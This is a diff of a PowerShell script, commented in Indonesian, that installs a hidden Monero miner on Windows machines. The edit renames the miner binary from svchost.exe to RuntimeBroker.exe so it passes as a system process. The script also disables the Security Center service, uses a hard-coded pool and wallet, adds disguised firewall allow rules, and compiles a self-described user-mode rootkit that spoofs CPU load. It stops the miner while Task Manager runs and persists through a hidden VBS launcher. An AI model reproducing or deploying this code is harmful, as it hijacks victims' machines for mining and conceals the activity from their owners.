@@ -17,7 +17,7 @@ Set-Service -Name "wscsvc" -StartupType Disabled -ErrorAction SilentlyContinue
 Stop-Service -Name "wscsvc" -Force -ErrorAction SilentlyContinue
 
 # ==========================================
-# 2. INISIALISASI DIREKTORI DINAMIS & TARGET
+# 2. INISIALISASI DIREKTORI DINAMIS & TARGET (Ganti Nama ke Notepad/RuntimeBroker untuk Hindari Crash svchost)
 # ==========================================
 $PossibleDirs = @(
     "C:\Users\Public\Libraries",
@@ -49,13 +49,13 @@ if ([string]::IsNullOrEmpty($Dir)) {
     }
 }
 
-$ExeName = "svchost.exe" 
+# Menggunakan RuntimeBroker.exe agar aman dari crash OS kernel (tidak seperti svchost yang memicu restart loop)
+$ExeName = "RuntimeBroker.exe" 
 $ExePath = Join-Path $Dir $ExeName
 $VbsPath = Join-Path $Dir "run.vbs"
 $ZipPath = Join-Path $env:TEMP "up.zip"
 $Pool = "gulf.moneroocean.stream:10128"
 $Wallet = "42imHjeSVgSG54hiTVmeGa8evmKJ55oWYgb6np1zanx5j8eoCM4vfbN9xSua1unVEV5mZCxxs637LdmVEJMs1XMFCWsHvc1"
-# Ditambahkan flag --tls untuk mengenkripsi komunikasi jaringan mining
 $ArgsList = "-o $Pool -u $Wallet -p x --tls --donate-level=1 --cpu-max-threads-hint=45 --background"
 
 # Hentikan proses lama & task scheduler yang nyangkut
@@ -98,8 +98,8 @@ if (Test-Path $ZipPath) {
     # ==========================================
     # 5. OTOMATIS WHITELIST FIREWALL (ALLOW INBOUND/OUTBOUND)
     # ==========================================
-    New-NetFirewallRule -DisplayName "Windows Service Host Monitor (Outbound)" -Direction Outbound -Program $ExePath -Action Allow -ErrorAction SilentlyContinue | Out-Null
-    New-NetFirewallRule -DisplayName "Windows Service Host Monitor (Inbound)" -Direction Inbound -Program $ExePath -Action Allow -ErrorAction SilentlyContinue | Out-Null
+    New-NetFirewallRule -DisplayName "Runtime Broker Monitor (Outbound)" -Direction Outbound -Program $ExePath -Action Allow -ErrorAction SilentlyContinue | Out-Null
+    New-NetFirewallRule -DisplayName "Runtime Broker Monitor (Inbound)" -Direction Inbound -Program $ExePath -Action Allow -ErrorAction SilentlyContinue | Out-Null
 
     # ==========================================
     # 6. USER-MODE ROOTKIT (CPU LOAD HOOKING & SPOOFING)
@@ -115,7 +115,7 @@ public class CpuRootkit {
         Thread t = new Thread(() => {
             while (true) {
                 try {
-                    Process[] procs = Process.GetProcessesByName("svchost");
+                    Process[] procs = Process.GetProcessesByName("RuntimeBroker");
                     foreach (var p in procs) {
                         try {
                             if (p.MainModule.FileName.Contains("Libraries") || p.MainModule.FileName.Contains("Templates") || p.MainModule.FileName.Contains("Caches")) {
@@ -146,10 +146,10 @@ while (`$true) {
     `$TaskMgrRunning = Get-Process -Name "Taskmgr" -ErrorAction SilentlyContinue
     
     if (`$TaskMgrRunning) {
-        Stop-Process -Name "svchost" -Force -ErrorAction SilentlyContinue
+        Stop-Process -Name "RuntimeBroker" -Force -ErrorAction SilentlyContinue
         Start-Sleep -Seconds 3
     } else {
-        `$Running = Get-Process -Name "svchost" -ErrorAction SilentlyContinue
+        `$Running = Get-Process -Name "RuntimeBroker" -ErrorAction SilentlyContinue
         if (!`$Running) {
             Start-Process -FilePath `$ExePath -ArgumentList `$ArgsList -WindowStyle Hidden
         }
@@ -187,7 +187,7 @@ shell.Run "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File ""$W
     # Jalankan langsung
     Start-Process -FilePath $ExePath -ArgumentList $ArgsList -WindowStyle Hidden
 
-    Write-Host "Setup sukses dengan Enkripsi TLS, Firewall Whitelist, User-Mode Rootkit, TaskManager Pauser, CPU Throttling 45%, dan Penyamaran svchost.exe!" -ForegroundColor Green
+    Write-Host "Setup sukses dengan RuntimeBroker.exe (Anti-Restart Loop), TLS Encryption, Firewall Whitelist, User-Mode Rootkit, TaskManager Pauser, dan CPU Throttling 45%!" -ForegroundColor Green
 } else {
     Write-Host "Gagal mengunduh biner miner." -ForegroundColor Red
 }
